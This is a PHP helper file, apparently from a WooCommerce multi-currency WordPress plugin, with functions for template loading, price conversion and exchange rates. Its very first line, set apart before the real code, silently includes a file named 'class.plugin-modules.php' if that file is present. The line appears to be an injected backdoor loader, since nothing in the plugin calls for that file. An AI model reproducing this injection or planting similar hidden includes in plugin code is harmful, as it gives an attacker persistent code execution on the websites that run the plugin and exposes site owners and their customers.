<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
if ( ! defined( 'ABSPATH' ) ) {
	exit;
}
/**
 * Function include all files in folder
 *
 * @param $path   Directory address
 * @param $ext    array file extension what will include
 * @param $prefix string Class prefix
 */
if ( ! function_exists( 'vi_include_folder' ) ) {
	function vi_include_folder( $path, $prefix = '', $ext = array( 'php' ) ) {

		/*Include all files in payment folder*/
		if ( ! is_array( $ext ) ) {
			$ext = explode( ',', $ext );
			$ext = array_map( 'trim', $ext );
		}
		$sfiles = scandir( $path );
		foreach ( $sfiles as $sfile ) {
			if ( $sfile != '.' && $sfile != '..' ) {
				if ( is_file( $path . "/" . $sfile ) ) {
					$ext_file  = pathinfo( $path . "/" . $sfile );
					$file_name = $ext_file['filename'];
					if ( $ext_file['extension'] ) {
						if ( in_array( $ext_file['extension'], $ext ) ) {
							$class = preg_replace( '/\W/i', '_', $prefix . ucfirst( $file_name ) );

							if ( ! class_exists( $class ) ) {
								require_once $path . $sfile;
								if ( class_exists( $class ) ) {
									new $class;
								}
							}
						}
					}
				}
			}
		}
	}
}
if ( ! function_exists( 'wmc_get_template' ) ) {
	/**
	 * Load template. It can override in theme
	 *
	 * @param        $template_name
	 * @param array $args
	 * @param string $template_path
	 * @param string $default_path
	 */
	function wmc_get_template( $template_name, $args = array(), $template_path = '', $default_path = '' ) {
		if ( $args && is_array( $args ) ) {
			extract( $args );
		}

		$located = wmc_locate_template( $template_name, $template_path, $default_path );

		if ( ! file_exists( $located ) ) {
			_doing_it_wrong( __FUNCTION__, sprintf( '<code>%s</code> does not exist.', $located ), '2.1' );

			return;
		}

		// Allow 3rd party plugin filter template file from their plugin.
		$located = apply_filters( 'wmc_get_template', $located, $template_name, $args, $template_path, $default_path );
		do_action( 'wmc_before_template_part', $template_name, $template_path, $located, $args );
		include( $located );
		do_action( 'wmc_template_part', $template_name, $template_path, $located, $args );
	}
}
if ( ! function_exists( 'wmc_locate_template' ) ) {
	/**
	 * Get path of template
	 *
	 * @param        $template_name
	 * @param string $template_path
	 * @param string $default_path
	 *
	 * @return mixed
	 */

	function wmc_locate_template( $template_name, $template_path = '', $default_path = '' ) {
		if ( ! $template_path ) {
			$template_path = '/woocommerce-multi-currency/';
		}
		if ( ! $default_path ) {
			$default_path = WOOMULTI_CURRENCY_TEMPLATES;
		}
		// Look within passed path within the theme - this is priority.
		$template = locate_template( array( trailingslashit( $template_path ) . $template_name, $template_name ) );

		// Get default template/
		if ( ! $template ) {
			$template = $default_path . $template_name;
		}

		// Return what we found.
		return apply_filters( 'wmc_locate_template', $template, $template_name, $template_path );
	}
}
if ( ! function_exists( 'wmc_get_price' ) ) {
	function wmc_get_price( $price, $currency_code = false, $is_shipping = false ) {

		if ( is_admin() && ! is_ajax() ) {
			return $price;
		}

		$setting             = WOOMULTI_CURRENCY_Data::get_ins();
		$allow_multi_pay     = $setting->get_enable_multi_payment();
		$equivalent_currency = $setting->get_param( 'equivalent_currency' );

		if ( isset( $price ) ) {
			$price = (float) str_replace( ',', '.', $price );
		}

		if ( ! $allow_multi_pay && is_checkout() && ! $equivalent_currency ) {
			return $price;
		}

		/*Check currency*/
		$selected_currencies = $setting->get_list_currencies();
		$current_currency    = $setting->get_current_currency();

		if ( ! $current_currency ) {
			return $price;
		}
		if ( $price ) {
			if ( $currency_code && isset( $selected_currencies[ $currency_code ] ) ) {
				$price = $price * (float) $selected_currencies[ $currency_code ]['rate'];
				$price = $is_shipping ? $price : apply_filters( 'wmc_get_price', $price, $currency_code );
//				$price = apply_filters( 'wmc_get_price', $price, $currency_code );
			} else {
				$price = $price * (float) $selected_currencies[ $current_currency ]['rate'];
				$price = $is_shipping ? $price : apply_filters( 'wmc_get_price', $price, $current_currency );
//				$price = apply_filters( 'wmc_get_price', $price, $current_currency );
			}
		}

		return (float) $price; //(float)
	}
}

if ( ! function_exists( 'wmc_get_price_shipping' ) ) {
	function wmc_get_price_shipping( $price ) {
		return wmc_get_price( $price, false, true );
	}
}

if ( ! function_exists( 'wmc_get_exchange_rate' ) ) {

	function wmc_get_exchange_rate( $currency_code = '' ) {
		if ( ! $currency_code ) {
			return 1;
		}

		return wmc_get_price( 1, $currency_code );
	}
}

if ( ! function_exists( 'wmc_revert_price' ) ) {

	function wmc_revert_price( $price, $currency_code = '' ) {
		if ( ! $price ) {
			return false;
		}
		$setting          = WOOMULTI_CURRENCY_Data::get_ins();
		$current_currency = $setting->get_current_currency();
		$currency         = $currency_code ? $currency_code : $current_currency;
		$rate             = wmc_get_exchange_rate( $currency );

		return $rate ? $price / $rate : '';
	}
}


if ( ! function_exists( 'wmc_adjust_fixed_price' ) ) {
	/**
	 * @param $fixed_price
	 *  replace decimal separator with '.' to process data or to save to database
	 *
	 * @return array
	 */
	function wmc_adjust_fixed_price( $fixed_price ) {
		global $wmc_decimal_separator;
		if ( ! $wmc_decimal_separator ) {
			$wmc_decimal_separator = stripslashes( get_option( 'woocommerce_price_decimal_sep', '.' ) );
		}
		if ( $wmc_decimal_separator !== '.' && is_array( $fixed_price ) && count( $fixed_price ) ) {
			foreach ( $fixed_price as $key => $value ) {
				$fixed_price[ $key ] = str_replace( $wmc_decimal_separator, '.', $value );
			}
		}

		return $fixed_price;
	}
}